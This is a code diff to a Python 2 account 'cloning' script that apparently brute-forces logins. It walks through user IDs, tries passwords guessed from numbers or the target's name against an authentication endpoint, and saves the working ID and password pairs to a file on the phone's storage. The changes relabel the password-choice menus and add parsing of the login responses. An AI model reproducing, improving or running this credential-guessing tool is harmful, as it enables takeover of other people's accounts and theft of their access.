@@ -125,8 +125,8 @@ def menu2():
 	print "|[✓] Name: "+name
 	print "|[✓] ID  : "+id
 	print "-"+46*"-"
-	print "[1] Clone With 5 Choice Passwords."
-	print "[2] Clone With 2 Choice Passwords."
+	print "[1] Clone With 2 Numer Passwords."
+	print "[2] Clone With 2 Name Passwords."
 	print "[0] Back To Main Menu."
 	print "                      "
 	menu2_menu()
@@ -237,6 +237,7 @@ def choice1_menu():
 		    pass
 		try:
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
+		    q = json.loads(data)
 		    if "loc" in q:
 			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
 			ok = open('/sdcard/ids/jam_OK.txt', 'a')
@@ -251,6 +252,7 @@ def choice1_menu():
                         cps.append(uid + pass1)
 		    else:
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
+			q = json.loads(data)
 		        if "loc" in q:
 			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
 			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
@@ -363,6 +365,7 @@ def choice2_menu():
 		try:
 		    pass1 = name.lower() + p1
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = br.addheader).text
+		    q = json.loads(data)
 		    if "loc" in q:
 			print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1
 			ok = open('/sdcard/ids/jam_OK.txt', 'a')
@@ -378,6 +381,7 @@ def choice2_menu():
 		    else:
 			pass2 = name.lower() + p2
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = br.addheader).text
+			q = json.loads(data)
 		        if "loc" in q:
 			    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2
 			    ok = open('/sdcard/ids/jam_OK.txt', 'a')
